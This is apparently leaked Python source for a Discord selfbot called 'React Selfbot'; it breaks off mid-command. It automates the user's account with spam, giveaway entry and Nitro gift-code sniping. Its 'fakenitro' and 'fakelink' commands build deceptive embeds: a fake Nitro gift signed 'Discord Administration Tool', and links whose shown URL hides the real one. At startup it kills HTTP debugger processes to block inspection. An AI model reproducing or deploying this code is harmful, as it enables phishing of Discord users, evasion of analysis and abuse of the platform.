#leaked by spencer LMFAOO
aqua= 0x00ffff

import discord
import time
import asyncio
import requests
import json
import ctypes
import sys
import random
import winsound
import re
import httpx
import os
import string
import subprocess
import base64
import socket
import shutil
import platform
import psutil
import wmi
import math
import aiohttp
import codecs
import inspect
import upsidedown
import cursor
import datetime as date
import urllib.parse
import urbandict as ud
from colorama import init, Fore, Back, Style
from tcp_latency import measure_latency
from pyfiglet import Figlet
from discord.ext import commands
from pypresence import Presence
from math import sqrt
from bs4 import BeautifulSoup
from datetime import datetime, timedelta
from random import randrange
from lorem_text import lorem

for proc in psutil.process_iter():
    try:
        processName = proc.name()
        if processName == "HTTPDebuggerUI.exe":
            proc.terminate()
        if processName == "HTTPDebuggerSvc.exe":
            proc.terminate()
    except:
        pass


def GetUUID():
    cmd = 'wmic csproduct get uuid'
    uuid = str(subprocess.check_output(cmd))
    pos1 = uuid.find("\
")+2
    uuid = uuid[pos1:-15]
    return uuid

username = json.load(open('config.json'))['username']
password = json.load(open('config.json'))['password']
hwid = base64.b64encode(GetUUID().encode())

logindata = {'username': f'username', 'password': f'password', 'hwid': f'hwid'}

authrequest = requests.post(f'http://api.over.menu/selfbot/auth', data={'username': urllib.parse.quote(username), 'password': urllib.parse.quote(password), 'hwid': urllib.parse.quote(hwid)})

size = 'mode 80,25'
os.system(size)

authresponse = authrequest.json()

init()

if authresponse['success'] == True:

    prefix = json.load(open('config.json'))['prefix']
    color = json.load(open('config.json'))['embed_color']
    embed_footer = json.load(open('config.json'))['embed_footer']
    embed_thumbnail_url = json.load(open('config.json'))['embed_thumbnail_url']
    delete_timeout = json.load(open('config.json'))['delete_timeout']
    rich_presence = json.load(open('config.json'))['rich_presence']
    global_emoji = json.load(open('config.json'))['global_emoji']

    if rich_presence == True:
        RPC = Presence('754442921302032604')
        RPC.connect()
        RPC.update(state="Using React Selfbot", large_image='react', start=time.time())

    try:
        embed_color = int(color.replace('#', '0x'), 0)
    except:
        embed_color = aqua

    emoji_dict = {
        'a': ['ðŸ‡¦', 'ðŸ…°', 'ðŸ™', 'ðŸ”¼', '4âƒ£'],
        'b': ['ðŸ‡§', 'ðŸ…±', '8âƒ£'],
        'c': ['ðŸ‡¨', 'Â©', 'ðŸ—œ'],
        'd': ['ðŸ‡©', 'â†©'],
        'e': ['ðŸ‡ª', '3âƒ£', 'ðŸ“§', 'ðŸ’¶'],
        'f': ['ðŸ‡«', 'ðŸŽ'],
        'g': ['ðŸ‡¬', 'ðŸ—œ', '6âƒ£', '9âƒ£', 'â›½'],
        'h': ['ðŸ‡­', 'â™“'],
        'i': ['ðŸ‡®', 'â„¹', 'ðŸš¹', '1âƒ£'],
        'j': ['ðŸ‡¯', 'ðŸ—¾'],
        'k': ['ðŸ‡°', 'ðŸŽ‹'],
        'l': ['ðŸ‡±', '1âƒ£', 'ðŸ‡®', 'ðŸ‘¢', 'ðŸ’·'],
        'm': ['ðŸ‡²', 'â“‚', 'ðŸ“‰'],
        'n': ['ðŸ‡³', 'â™‘', 'ðŸŽµ'],
        'o': ['ðŸ‡´', 'ðŸ…¾', '0âƒ£', 'â­•', 'ðŸ”˜', 'âº', 'âšª', 'âš«', 'ðŸ”µ', 'ðŸ”´', 'ðŸ’«'],
        'p': ['ðŸ‡µ', 'ðŸ…¿'],
        'q': ['ðŸ‡¶', 'â™Œ'],
        'r': ['ðŸ‡·', 'Â®'],
        's': ['ðŸ‡¸', 'ðŸ’²', '5âƒ£', 'âš¡', 'ðŸ’°', 'ðŸ’µ'],
        't': ['ðŸ‡¹', 'âœ', 'âž•', 'ðŸŽš', 'ðŸŒ´', '7âƒ£'],
        'u': ['ðŸ‡º', 'â›Ž', 'ðŸ‰'],
        'v': ['ðŸ‡»', 'â™ˆ', 'â˜‘'],
        'w': ['ðŸ‡¼', 'ã€°', 'ðŸ“ˆ'],
        'x': ['ðŸ‡½', 'âŽ', 'âœ–', 'âŒ', 'âš’'],
        'y': ['ðŸ‡¾', 'âœŒ', 'ðŸ’´'],
        'z': ['ðŸ‡¿', '2âƒ£'],
        '0': ['0âƒ£', 'ðŸ…¾', '0âƒ£', 'â­•', 'ðŸ”˜', 'âº', 'âšª', 'âš«', 'ðŸ”µ', 'ðŸ”´', 'ðŸ’«'],
        '1': ['1âƒ£', 'ðŸ‡®'],
        '2': ['2âƒ£', 'ðŸ‡¿'],
        '3': ['3âƒ£'],
        '4': ['4âƒ£'],
        '5': ['5âƒ£', 'ðŸ‡¸', 'ðŸ’²', 'âš¡'],
        '6': ['6âƒ£'],
        '7': ['7âƒ£'],
        '8': ['8âƒ£', 'ðŸŽ±', 'ðŸ‡§', 'ðŸ…±'],
        '9': ['9âƒ£'],
        '?': ['â“'],
        '!': ['â—', 'â•', 'âš ', 'â£'],
        'combination': [
            ['cool', 'ðŸ†’'],
            ['back', 'ðŸ”™'],
            ['soon', 'ðŸ”œ'],
            ['free', 'ðŸ†“'],
            ['end', 'ðŸ”š'],
            ['top', 'ðŸ”'],
            ['abc', 'ðŸ”¤'],
            ['atm', 'ðŸ§'],
            ['new', 'ðŸ†•'],
            ['sos', 'ðŸ†˜'],
            ['100', 'ðŸ’¯'],
            ['loo', 'ðŸ’¯'],
            ['zzz', 'ðŸ’¤'],
            ['...', 'ðŸ’¬'],
            ['ng', 'ðŸ†–'],
            ['id', 'ðŸ†”'],
            ['vs', 'ðŸ†š'],
            ['wc', 'ðŸš¾'],
            ['ab', 'ðŸ†Ž'],
            ['cl', 'ðŸ†‘'],
            ['ok', 'ðŸ†—'],
            ['up', 'ðŸ†™'],
            ['10', 'ðŸ”Ÿ'],
            ['11', 'â¸'],
            ['ll', 'â¸'],
            ['ii', 'â¸'],
            ['tm', 'â„¢'],
            ['on', 'ðŸ”›'],
            ['oo', 'ðŸˆ'],
            ['!?', 'â‰'],
            ['!!', 'â€¼'],
            ['21', 'ðŸ“…'],
            ]
    }

    def replace_combos(react):
        for combo in emoji_dict['combination']:
            if combo[0] in react:
                react = react.replace(combo[0], combo[1], 1)
        return react

    def replace_letters(react):
        for char in 'abcdefghijklmnopqrstuvwxyz0123456789!?':
            char_count = react.count(char)
            if char_count > 1:
                if len(emoji_dict[char]) >= char_count:
                    i = 0
                    while i < char_count:
                        if emoji_dict[char][i] not in react:
                            react = react.replace(char, emoji_dict[char][i], 1)
                        else:
                            char_count += 1
                        i += 1
            else:
                if char_count == 1:
                    react = react.replace(char, emoji_dict[char][0])
        return react
    
    def has_dupe(dupe):
        collect_my_duper = list(filter(lambda x: x != 'âƒ£', dupe))
        return len(set(collect_my_duper)) != len(collect_my_duper)

    def find_channel(channel_list, text):
        if text.isdigit():
            found_channel = discord.utils.get(channel_list, id=int(text))
        elif text.startswith("<#") and text.endswith(">"):
            found_channel = discord.utils.get(channel_list,
                                            id=text.replace("<", "").replace(">", "").replace("#", ""))
        else:
            found_channel = discord.utils.get(channel_list, name=text)
        return found_channel

    bot = commands.Bot(command_prefix = prefix, self_bot = True)
    bot.remove_command('help')

    print('
')
    print(Fore.BLUE + Style.BRIGHT + 'â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—'.center(os.get_terminal_size().columns))
    print('â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â•â•šâ•â•â–ˆâ–ˆâ•”â•â•â•'.center(os.get_terminal_size().columns))
    print('â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘        â–ˆâ–ˆâ•‘   '.center(os.get_terminal_size().columns))
    print('â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘        â–ˆâ–ˆâ•‘   '.center(os.get_terminal_size().columns))
    print('â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•‘   '.center(os.get_terminal_size().columns))
    print('â•šâ•â•  â•šâ•â•â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â• â•šâ•â•â•â•â•â•   â•šâ•â•   
'.center(os.get_terminal_size().columns))

    userinfo = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers={'authorization': json.load(open('config.json'))['token'], 'user-agent': 'Mozilla/5.0'})
    userdata = json.loads(userinfo.content)
    username = userdata['username']
    reactusername = json.load(open('config.json'))['username']
    discriminator = userdata['discriminator']
    sys.stdout.write(f'\x1b]2;React Selfbot | Logged in as {username}#{discriminator} ({reactusername})\x07')

    width = os.get_terminal_size().columns

    for i in range(width):
        print('_', end='')

    print('
')

    cursor.hide()

    @bot.event
    async def on_command_error(ctx, error):
        return

    @bot.command()
    async def ping(ctx):
        if ctx.message.author != bot.user:
            return
        await ctx.message.delete()
        latency = round(measure_latency(host='google.com')[0])
        embed = discord.Embed(title='Pong!', description=f'Your latency is {latency}ms', color=embed_color)
        embed.set_footer(text=embed_footer)
        embed.set_thumbnail(url=embed_thumbnail_url)
        embed.timestamp = date.datetime.utcnow()
        await ctx.send(embed=embed, delete_after=delete_timeout)

    @bot.command()
    async def rockstarid(ctx, username: str=None):
        if username is None:
            print('\033[1;31;40mMissing arguments')
        else:
            await ctx.message.delete()
            resolving_embed = discord.Embed(title=username, color=embed_color, description=f'Resolving {username}...')
            resolving_embed.set_footer(text=embed_footer)
            resolving_embed.timestamp = date.datetime.utcnow()
            resolving_embed.set_thumbnail(url=embed_thumbnail_url)
            response = await ctx.send(embed=resolving_embed, delete_after=delete_timeout)

            rid = requests.get(f'http://api.over.menu/api/convert/rid/{username}', timeout=10)
            
            resolved_embed = discord.Embed(title=username, color=embed_color, description=f'Rockstar ID: {rid.text}')
            resolved_embed.set_footer(text=embed_footer)
            resolved_embed.timestamp = date.datetime.utcnow()
            resolved_embed.set_thumbnail(url='https://upload.wikimedia.org/wikipedia/commons/thumb/5/53/Rockstar_Games_Logo.svg/1113px-Rockstar_Games_Logo.svg.png')
            await response.edit(embed=resolved_embed)

    @bot.command()
    async def ascii(ctx, *, text: str=None):
        if text is None:
            print('\033[1;31;40mMissing arguments')
            return
        else:
            await ctx.message.delete()
            f = Figlet()
            j = (f.renderText(text))
            try:
                embed = discord.Embed(color=embed_color, description=f"```{j}```",timestamp=date.datetime.utcfromtimestamp(time.time()))
                embed.set_footer(text=embed_footer)
                await ctx.send(embed=embed, delete_after=delete_timeout)
            except discord.HTTPException:
                return

    @bot.command()
    async def ipresolve(ctx, ip: str=None):
        if ip is None:
            print('\033[1;31;40mMissing arguments')
            return
        else:
            try:
                await ctx.message.delete()
                resp = requests.get(f'https://ipinfo.io/{ip}/json')
                if "Wrong ip" in resp.text:
                    print('\033[1;31;40mInvalid IP address')
                    return
                else:
                    try:
                        j = resp.json()
                        embed= discord.Embed(color=embed_color, title=f"IP Information",timestamp=date.datetime.utcfromtimestamp(time.time()))
                        embed.set_thumbnail(url=embed_thumbnail_url)
                        embed.add_field(name=f'IP', value=f'{ip}', inline=True)
                        embed.add_field(name=f'City', value=f'{j["city"]}', inline=True)
                        embed.add_field(name=f'Region', value=f'{j["region"]}', inline=True)
                        embed.add_field(name=f'Country', value=f'{j["country"]}', inline=True)
                        embed.add_field(name=f'Coordinates', value=f'{j["loc"]}', inline=True)
                        embed.add_field(name=f'Postal', value=f'{j["postal"]}', inline=True)
                        embed.add_field(name=f'Timezone', value=f'{j["timezone"]}', inline=True)
                        embed.add_field(name=f'Organization', value=f'{j["org"]}', inline=True)
                        embed.set_footer(text=embed_footer)
                        await ctx.send(embed=embed, delete_after=delete_timeout)
                    except discord.HTTPException:
                        return
            except:
                return

    @bot.command()
    async def playing(ctx, *, status: str=None):
        if status is None:
            print(Fore.RED + 'Missing arguments')
            return
        else:
            try:
                await ctx.message.delete()
                print(Fore.GREEN + f'Now playing: {status}')
                await bot.change_presence(activity=discord.Game(name=status))
            except Exception:
                return

    @bot.command()
    async def streaming(ctx, *, status: str=None):
        if status is None:
            print(Fore.RED + 'Missing arguments')
            return
        else:
            try:
                await ctx.message.delete()
                print(Fore.GREEN + f'Now streaming: {status}')
                await bot.change_presence(activity=discord.Streaming(name=status, url='https://twitch.tv/monstercat'))
            except Exception:
                return

    @bot.command()
    async def listening(ctx, *, status: str=None):
        if status is None:
            print(Fore.RED + 'Missing arguments')
            return
        else:
            try:
                await ctx.message.delete()
                print(Fore.GREEN + f'Now listening to: {status}')
                await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=status))
            except Exception:
                return

    @bot.command()
    async def watching(ctx, *, status: str=None):
        if status is None:
            print(Fore.RED + 'Missing arguments')
            return
        else:
            try:
                await ctx.message.delete()
                print(Fore.GREEN + f'Now watching: {status}')
                await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=status))
            except Exception:
                return

    @bot.command()
    async def removestatus(ctx):
        try:
            await ctx.message.delete()
            game = discord.Activity(type=-1)
            await bot.change_presence(activity=game)
            print(Fore.GREEN + "Status removed")
        except Exception:
            return

    @bot.command(pass_context=True)
    async def typing(ctx):
        try:
            await ctx.message.delete()
            async with ctx.channel.typing():
                await asyncio.sleep(3600)
        except Exception:
            return

    @bot.command()
    async def invisiblenickname(ctx):
        try:
            await ctx.message.delete()
            name = ' ážµážµ ážµážµ ážµážµ ážµážµâ€Ž'
            await ctx.author.edit(nick=name)
            embed = discord.Embed(color=embed_color, title=f'Your nickname is now invisible',timestamp=date.datetime.utcfromtimestamp(time.time()))
            embed.set_thumbnail(url=embed_thumbnail_url)
            embed.set_footer(text=embed_footer)
            await ctx.send(embed=embed, delete_after=delete_timeout)
        except Exception:
            return

    @bot.command()
    async def junknickname(ctx):
        try:
            await ctx.message.delete()
            name = "ð’«ð’«ð’«ð’«ð’«ð’«ð’«ð’«ð’«ð’«ð’«ð’«ð’«ð’«ð’«ð’«ð’«ð’«ð’«ð’«ð’«ð’«ð’«ð’«ð’«ð’«ð’«" 
            await ctx.author.edit(nick=name)
            embed = discord.Embed(color=embed_color, title=f'Your nickname is now junk',timestamp=date.datetime.utcfromtimestamp(time.time()))
            embed.set_thumbnail(url=embed_thumbnail_url)
            embed.set_footer(text=embed_footer)
            await ctx.send(embed=embed, delete_after=delete_timeout)
        except Exception:
            return

    afk_stat = 0
    uwu_stat = 0

    @bot.command()
    async def afk(ctx):
        await ctx.message.delete()
        global afk_stat
        if afk_stat == 0:
            afk_stat += 1
            embed = discord.Embed(color=embed_color, title=f'AFK Mode `enabled`',timestamp=date.datetime.utcfromtimestamp(time.time()))
            embed.set_thumbnail(url=embed_thumbnail_url)
            embed.set_footer(text=embed_footer)
            await ctx.send(embed=embed, delete_after=delete_timeout)
                
        elif afk_stat == 1:
            afk_stat -= 1
            embed = discord.Embed(color=embed_color, title=f'AFK Mode `disabled`',timestamp=date.datetime.utcfromtimestamp(time.time()))
            embed.set_thumbnail(url=embed_thumbnail_url)
            embed.set_footer(text=embed_footer)
            await ctx.send(embed=embed, delete_after=delete_timeout)

    @bot.command()
    async def uwumode(ctx):
        await ctx.message.delete()
        global uwu_stat
        if uwu_stat == 0:
            uwu_stat += 1
            embed = discord.Embed(color=embed_color, title=f'UwU Mode `enabled`',timestamp=date.datetime.utcfromtimestamp(time.time()))
            embed.set_thumbnail(url=embed_thumbnail_url)
            embed.set_footer(text=embed_footer)
            await ctx.send(embed=embed, delete_after=delete_timeout)
                
        elif uwu_stat == 1:
            uwu_stat -= 1
            embed = discord.Embed(color=embed_color, title=f'UwU Mode `disabled`',timestamp=date.datetime.utcfromtimestamp(time.time()))
            embed.set_thumbnail(url=embed_thumbnail_url)
            embed.set_footer(text=embed_footer)
            await ctx.send(embed=embed, delete_after=delete_timeout)

    def UwUText(text):
        length = len(text)
        output_text = ''

        for i in range(length):
            current_char = text[i]
            previous_char = '&# 092;&# 048;'

            if i > 0:
                previous_char = text[i - 1]
            
            if current_char == 'L' or current_char == 'R':
                output_text += 'W'

            elif current_char == 'l' or current_char == 'r':
                output_text += 'w'
            
            elif current_char == 'O' or current_char == 'o': 
                if previous_char == 'N' or previous_char == 'n' or previous_char == 'M' or previous_char == 'm': 
                    output_text += "yo"
                else: 
                    output_text += current_char 
            
            else:
                output_text += current_char
            
        return output_text

    nitroRegex = re.compile('(discord.com/gifts/|discordapp.com/gifts/|discord.gift/)([a-zA-Z0-9]+)')

    @bot.event
    async def on_message(msg):
        global afk_stat
        global uwu_stat

        if uwu_stat == 1:
            if msg.author == bot.user:
                if 'uwumode' in str(msg.content):
                    await bot.process_commands(msg)
                    return
                else:
                    await msg.edit(content=UwUText(msg.content))
        await bot.process_commands(msg)
        if afk_stat == 1:
            with open('config.json') as config:
                afkmessage = json.load(config)['afk_message']
                if afkmessage == '':
                    afkmessage = 'I\'m currently afk and unreachable, please try to contact me later.'

            if msg.guild is None:
                if msg.author == bot.user:
                    return
                await msg.channel.send(afkmessage)

        if json.load(open('config.json'))['giveaway_sniper'] == True:
            if (('**giveaway**' in str(msg.content).lower() or ('react with' in str(msg.content).lower() and 'giveaway' in str(msg.content).lower()))):
                try:
                    await asyncio.sleep(json.load(open('config.json'))['giveaway_timeout'])
                    await msg.add_reaction('ðŸŽ‰')
                    print(Fore.GREEN + "Entered Giveaway" + Fore.RED + " [" + msg.guild.name + " - " + msg.channel.name + "]" + Fore.RESET)
                    if json.load(open('config.json'))['giveaway_beep'] == True:
                        winsound.Beep(200, 500)
                except:
                    return

            if '<@' + str(bot.user.id) + '>' in msg.content and ('giveaway' in str(msg.content).lower() or 'won' in msg.content or 'winner' in str(msg.content).lower()):
                print(Fore.GREEN + "Congratulations! You won a Giveaway:" + Fore.RED + " [" + msg.guild.name + " - " + msg.channel.name + "]" + Fore.RESET)
                if json.load(open('config.json'))['giveaway_beep'] == True:
                        winsound.Beep(200, 500)
        
        if json.load(open('config.json'))['nitro_sniper'] == True:
            if nitroRegex.search(msg.content):
                code = nitroRegex.search(msg.content).group(2)

                if len(code) < 16:
                    try:
                        print(Fore.RED + "Detected fake Nitro code" + Fore.RED + f" [{code}] | Sent by {msg.author.name}#{msg.author.discriminator} | From guild {msg.guild.name}" + Fore.RESET)
                    except:
                        print(Fore.RED + "Detected fake Nitro code" + Fore.RED + f" {code} | Sent by {msg.author.name}#{msg.author.discriminator}" + Fore.RESET)
                else:
                    async with httpx.AsyncClient() as client:
                        start_time = time.time()
                        result = await client.post(f'https://discordapp.com/api/v8/entitlements/gift-codes/{code}/redeem', json={'channel_id': str(msg.channel.id)}, headers={'authorization': json.load(open('config.json'))['token'], 'user-agent': 'Mozilla/5.0'})
                        delay = (time.time() - start_time)
                        try:
                            print(Fore.GREEN + "Sniped a Nitro Code!" + Fore.RED + f" [{code}] | Sent by {msg.author.name}#{msg.author.discriminator} | From guild {msg.guild.name}" + Fore.RESET)
                        except:
                            print(Fore.GREEN + "Sniped a Nitro Code!" + Fore.RED + f" [{code}] | Sent by {msg.author.name}#{msg.author.discriminator}" + Fore.RESET)
                
                    if 'This gift has been redeemed already' in str(result.content):
                        print(Fore.RED + "Nitro Code was already redeemed." + Fore.RESET)
                    elif 'nitro' in str(result.content):
                        print(Fore.GREEN + "Successfully redeemed the Nitro Code! " + Fore.YELLOW + f" [{code}] | Sent by {msg.author.name}#{msg.author.discriminator}" + Fore.RESET)
                    elif 'Unknown Gift Code' in str(result.content):
                        print(Fore.YELLOW + "Nitro Code is unknown." + Fore.RESET)
                        
                    print(Fore.GREEN + Style.BRIGHT + "Delay:" + Fore.GREEN + " %.3fs" % delay + Fore.RESET)

                    if json.load(open('config.json'))['nitro_beep'] == True:
                        winsound.Beep(200, 500)

    @bot.command()
    async def spam(ctx, amount:int=None, *, message: str=None):
        try:
            if amount is None or message is None:
                print(Fore.RED + 'Missing arguments')
            else:
                for i in range(0, amount):
                    await ctx.send(f'{message}')
        except Exception:
            return

    @bot.command()
    async def avatar(ctx, memberid: discord.Member=None):
        await ctx.message.delete()
        try:
            if memberid is None:
                member = ctx.author
            else:
                member = memberid
            av = member.avatar_url

            embed = discord.Embed(color=embed_color, timestamp=date.datetime.utcfromtimestamp(time.time()))
            embed.set_author(name=member.name, icon_url=av)
            embed.set_image(url=av)
            embed.set_footer(text=embed_footer)
            await ctx.send(embed=embed, delete_after=delete_timeout)
        except Exception:
            return

    @bot.command()
    async def serverlogo(ctx, serverid: int=None):
        await ctx.message.delete()
        if serverid is None:
            server = ctx.guild
        else: 
            server = discord.utils.get(ctx.bot.guilds, id=serverid)
        icon = server.icon_url

        embed = discord.Embed(color=embed_color, timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.set_author(name=server.name, icon_url=icon)
        embed.set_image(url=icon)
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)

    @bot.command()
    async def roleinfo(ctx, *, role: discord.Role):
        await ctx.message.delete()
        since_created = (ctx.message.created_at - role.created_at).days
        role_created = role.created_at.strftime("%d %b %Y %H:%M")
        created_on = "{} ({} days ago)".format(role_created, since_created)
        members = ''
        i = 0
        for user in role.members:
            members += f'{user.name}, '
            i+=1
            if i > 30:
                break

        if str(role.colour) == "#000000":
            colour = "default"
            color = ("#%06x" % random.randint(0, 0xFFFFFF))
            color = int(colour[1:], 16)
        else:
            colour = str(role.colour).upper()
            color = role.colour

        em = discord.Embed(colour=color, timestamp=date.datetime.utcfromtimestamp(time.time()))
        em.set_author(name=role.name)
        em.add_field(name="Users", value=len(role.members))
        em.add_field(name="Mentionable", value=role.mentionable)
        em.add_field(name="Hoist", value=role.hoist)
        em.add_field(name="Position", value=role.position)
        em.add_field(name="Managed", value=role.managed)
        em.add_field(name="Color", value=colour)
        em.add_field(name='Creation Date', value=created_on)
        em.add_field(name='Members', value=members[:-2], inline=False)
        em.add_field(name='Role ID', value=role.id, inline=False)
        em.set_thumbnail(url=embed_thumbnail_url)
        em.set_footer(text=embed_footer)

        await ctx.send(embed=em, delete_after=delete_timeout)

    @bot.command()
    async def serverinfo(ctx, server_id: int=None):
        await ctx.message.delete()
        if server_id is None:
            server = ctx.guild
        else: 
            server = discord.utils.get(ctx.bot.guilds, id=server_id)
        total_users = len(server.members)
        online = len([m for m in server.members if m.status != discord.Status.offline])
        text_channels = len([x for x in server.channels if isinstance(x, discord.TextChannel)])
        voice_channels = len([x for x in server.channels if isinstance(x, discord.VoiceChannel)])
        categories = len(server.channels) - text_channels - voice_channels
        passed = (ctx.message.created_at - server.created_at).days
        created_at = "Since {} ({} days ago)".format(server.created_at.strftime("%d %b %Y %H:%M"), passed)

        data = discord.Embed(description=created_at, color=embed_color, timestamp=date.datetime.utcfromtimestamp(time.time()))
        data.add_field(name="Region", value=str(server.region))
        data.add_field(name="Users", value="{}/{}".format(online, total_users))
        data.add_field(name="Text Channels", value=text_channels)
        data.add_field(name="Voice Channels", value=voice_channels)
        data.add_field(name="Categories", value=categories)
        data.add_field(name="Roles", value=len(server.roles))
        data.add_field(name="Verification Level", value=server.verication_level)
        data.add_field(name="Owner", value=str(server.owner))
        data.add_field(name="Server ID", value=str(server.id))
        data.set_footer(text=embed_footer)
        data.set_author(name=server.name, icon_url=None or server.icon_url)
        data.set_thumbnail(url=embed_thumbnail_url or server.icon_url)
        await ctx.send(embed=data, delete_after=delete_timeout)

    @bot.command()
    async def userinfo(ctx, *, user: discord.Member=None):
        await ctx.message.delete()
        if ctx.guild is not None:
            server = ctx.guild
            if user is None:
                member = ctx.author
            else:
                member = user
            avi = member.avatar_url
            roles = sorted(member.roles, key=lambda c: c.position / -1)

            rolenames = ' '.join([r.mention for r in roles if r.name != '@everyone']) or 'None'
            member_number = sorted(server.members, key=lambda m: m.joined_at).index(member) + 1

            resp = requests.get(f'https://canary.discordapp.com/api/v8/users/{member.id}/profile', headers={'authorization': json.load(open('config.json'))['token'], 'user-agent': 'Mozilla/5.0'})
            j = resp.json()
            premium_since = j['premium_since']

            channel = None
            streaming = False
            if member.voice is not None:
                channel = member.voice.channel
                streaming = member.voice.self_stream

            em = discord.Embed(colour=embed_color, timestamp=date.datetime.utcfromtimestamp(time.time()))
            em.add_field(name='Nickname', value=member.nick, inline=True)
            em.add_field(name='Member Number',value=str(member_number),inline = True)
            em.add_field(name='Account Created', value=member.created_at.__format__('%A, %d. %B %Y'))
            em.add_field(name='Join Date', value=member.joined_at.__format__('%A, %d. %B %Y'))
            em.add_field(name='Roles', value=rolenames, inline=True)
            em.add_field(name='Top Role', value=member.top_role.mention, inline=True)
            em.add_field(name='User ID', value=str(member.id), inline=True)
            em.add_field(name='Nitro Subscription Since', value=premium_since, inline=True)
            em.add_field(name='Is On Mobile', value=member.is_on_mobile(), inline=True)
            em.add_field(name='Is In Voice Channel', value=channel, inline=True)
            em.add_field(name='Is Streaming', value=streaming, inline=True)
            em.set_footer(text=embed_footer)
            em.set_thumbnail(url=avi)
            em.set_author(name=member, icon_url=server.icon_url)

            await ctx.send(embed=em, delete_after=delete_timeout)
        else:
            if user is None:
                member = ctx.author
            else:
                member = user
            avi = member.avatar_url
            resp = requests.get(f'https://canary.discordapp.com/api/v8/users/{member.id}/profile', headers={'authorization': json.load(open('config.json'))['token'], 'user-agent': 'Mozilla/5.0'})
            j = resp.json()
            premium_since = j['premium_since']

            em = discord.Embed(colour=embed_color, timestamp=date.datetime.utcfromtimestamp(time.time()))
            em.add_field(name='Account Created', value=member.created_at.__format__('%A, %d. %B %Y'))
            em.add_field(name='Is On Mobile', value=member.is_on_mobile(), inline=True)
            em.add_field(name='User ID', value=str(member.id), inline=True)
            em.add_field(name='Nitro Subscription Since', value=premium_since, inline=True)
            em.set_footer(text=embed_footer)
            em.set_thumbnail(url=avi)
            em.set_author(name=member, icon_url=avi)

            await ctx.send(embed=em, delete_after=delete_timeout)

    @bot.command()
    async def pokedex(ctx, pokemon: str=None):
        await ctx.message.delete()
        if pokemon is not None:
            resp = requests.get(f'https://some-random-api.ml/pokedex?pokemon={pokemon}')
            j = resp.json()
            embed= discord.Embed(color=embed_color, title=f'PokÃ©dex Information about {j["name"]}', description=f'{j["description"]}', timestamp=date.datetime.utcfromtimestamp(time.time()))
            embed.set_thumbnail(url=f'{j["sprites"]["animated"]}')
            embed.add_field(name=f'Name', value=f'{j["name"]}', inline=True)
            embed.add_field(name=f'ID', value=f'{j["id"]}', inline=True)
            embed.add_field(name=f'Species', value=f'{j["species"][0]}', inline=True)
            embed.add_field(name=f'Type', value=f'{j["type"][0]}', inline=True)
            embed.add_field(name=f'Height', value=f'{j["height"]}', inline=True)
            embed.add_field(name=f'Weight', value=f'{j["weight"]}', inline=True)
            embed.add_field(name=f'Generation', value=f'{j["generation"]}', inline=True)
            embed.set_footer(text=embed_footer)
            await ctx.send(embed=embed, delete_after=delete_timeout)
        else:
            print(Fore.RED + 'Missing arguments')

    @bot.command()
    async def urbandict(ctx, *, term: str=None):
        await ctx.message.delete()
        if term is not None:
            response = requests.get(f'https://api.urbandictionary.com/v0/define?term={term}')
            data = response.json()

            word = data['list'][0]['word']
            link = data['list'][0]['permalink']
            definition = data['list'][0]['definition'].replace('[', '').replace(']', '')
            example = data['list'][0]['example'].replace('[', '').replace(']', '')

            embed= discord.Embed(color=embed_color, title=f'Urban Dictionary', timestamp=date.datetime.utcfromtimestamp(time.time()))
            embed.set_thumbnail(url=embed_thumbnail_url)
            embed.add_field(name=f'Word', value=f'[{word}]({link})', inline=False)
            embed.add_field(name=f'Definition', value=f'{definition}', inline=False)
            embed.add_field(name=f'Example', value=f'{example}', inline=False)
            embed.set_footer(text=embed_footer)
            await ctx.send(embed=embed, delete_after=delete_timeout)
        else:
            print(Fore.RED + 'Missing arguments')

    @bot.command()
    async def fakenitro(ctx, url: str=None):
        await ctx.message.delete()
        if url is not None:
            letters_and_digits = string.ascii_letters + string.digits
            fake_nitro_url = ''.join((random.choice(letters_and_digits) for i in range(16)))

            embed= discord.Embed(color=0xFF7DE9, title=f'Successfully Generated Nitro', description=
            f'''
            Successfully generated Discord Nitro Code...
            **Code Type:** Classic
            **Gift Link:** [https://discord.gift/{fake_nitro_url}]({url})
            ''', 
            timestamp=date.datetime.utcfromtimestamp(time.time()))
            embed.set_thumbnail(url='https://images-ext-2.discordapp.net/external/oFcjLel4eGbAG5RIEEX_d8MtsYJO_4NYQiXxXl4NXEo/%3Fcb%3D20200615092656/https/vignette.wikia.nocookie.net/discord/images/b/b8/Nitro_badge.png/revision/latest/top-crop/width/220/height/220')
            embed.set_footer(text='Discord Administration Tool')
            await ctx.send(embed=embed)

    @bot.command()
    async def fakelink(ctx, fake_url: str=None, url: str=None):
        await ctx.message.delete()
        if url is not None:
            embed= discord.Embed(color=embed_color, description=
            f'''
            [{fake_url}]({url})
            ''')
            await ctx.send(embed=embed)

    @bot.command()
    async def nitro(ctx, amount: int=None):
        await ctx.message.delete()
        if amount is not None:
            for j in range(amount):
                letters_and_digits = string.ascii_letters + string.digits
